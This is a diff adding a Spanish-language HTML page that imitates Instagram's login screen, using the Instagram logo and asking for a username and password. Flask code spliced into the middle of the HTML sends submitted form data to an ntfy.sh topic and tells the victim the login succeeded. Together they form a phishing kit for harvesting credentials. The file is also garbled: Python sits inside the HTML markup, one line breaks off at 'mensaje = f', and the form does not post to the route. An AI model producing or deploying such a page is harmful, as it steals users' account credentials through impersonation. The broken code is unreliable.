@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 350px;
+      padding: 40px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+
+    .container img {
+      margin-bottom: 30px;
+      width: 175px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+
+    .btn-login {
+      margin-top: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .btn-login:hover {
+      background-color: #318ce7;
+    }
+
+    .separator {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      text-align: center;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .separator:not(:empty)::before {
+      margin-right: .75em;
+    }
+
+    .separator:not(:empty)::after {
+      margin-left: .75em;
+    }
+
+    .fb-login {
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+      display: block;
+      margin: 15px 0;
+    }
+
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo" />
+    <form action="#" method="POST">
+      <input type="text" placeholder="Teléfono, usuario o correo electrónico" required />
+      <input type="password" placeholder="Contraseña" required />
+      <button type="submit">Iniciar sesion</button>
+    </form>
+
+    
+    <div class="separator">O</div>
+
+    <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
+    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+@app.route('/enviar', methods=['POST'])
+def enviar():
+    try:
+        data = request.form
+        mensaje = f
+    <div class="signup">
+      ¿No tienes una cuenta? <a href="#">Regístrate</a>
+    </div>
+  </div>
+    # Enviar a ntfy.sh
+        response = requests.post(
+            "https://ntfy.sh/USER_BYN9",  # Cambia YOUR_TOPIC por tu tema único
+            data=mensaje.encode('utf-8'),
+            headers={
+                "Title": "Nuevo mensaje de contacto",
+                "Priority": "high"
+            }
+        )
+        
+        return "✅Inicio de sesión exitoso", 200
+    except Exception as e:
+        return f"Error al enviar: {str(e)}", 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+
+</body>
+</html>
